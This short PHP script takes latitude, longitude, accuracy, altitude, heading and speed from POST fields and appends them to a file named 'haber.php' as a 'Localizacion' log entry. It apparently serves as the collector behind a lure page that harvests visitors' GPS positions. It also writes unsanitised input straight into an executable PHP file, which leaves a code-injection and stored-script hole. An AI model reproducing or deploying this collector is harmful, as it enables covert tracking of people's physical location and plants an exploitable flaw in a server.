<?php
header('Content-Type: text/html');
{
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $acc = $_POST['Acc'];
  $alt = $_POST['Alt'];
  $dir = $_POST['Dir'];
  $spd = $_POST['Spd'];

  $data['info'] = array();

  $data['info'][] = array(
    'lat' => $lat,
    'lon' => $lon,
    'acc' => $acc,
    'alt' => $alt,
    'dir' => $dir,
    'spd' => $spd);

  $jdata = json_encode($data);

  $f = fopen('haber.php', 'a');
  fwrite($f, '<pre><tr><b><tr><b><font color="#FFFFFF" id="jdata">Localizacion:</font><b><font color="#F05921">'.$jdata.'</font></tr></b></b></tr></br></pre>
 

 ');
  fclose($f);
}
?>
